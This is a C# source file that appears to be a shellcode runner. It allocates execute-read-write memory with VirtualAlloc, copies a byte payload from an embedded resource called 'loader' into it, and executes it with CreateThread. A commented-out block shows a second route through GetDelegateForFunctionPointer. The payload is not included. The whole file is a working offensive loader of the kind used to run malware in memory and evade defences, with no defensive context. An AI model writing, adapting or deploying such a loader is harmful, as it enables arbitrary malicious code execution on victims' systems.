using GetDelegateForFunctionPointer.Properties;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace GetDelegateForFunctionPointer
{

    internal class GetDelegateForFunctionPointer
    {
        static void Main(string [] args)
        {
            
            //Marshal.Copy(x64shc, 0, (IntPtr)(funcAddr), x64shc.Length);
            /*
            pFunc f = (pFunc)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(pFunc));
            f();
            */

            int written = 0;
            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            Console.WriteLine("VirtualAlloc Shellcode size executable memory");
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero,(uint)Resources.loader.Length,0x1000, 0x40);
            Console.WriteLine("Write Shellcode");
            WriteProcessMemory(GetCurrentProcess(), funcAddr, Resources.loader, Resources.loader.Length, ref written);
            Console.WriteLine("Create thread");
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            Console.WriteLine("Run");
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return;
        }

        #region pinvokes

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        delegate void pFunc();

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress, 
            byte [] lpBuffer, 
            int nSize, 
            ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Process
        {
            PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        #endregion

    }
}
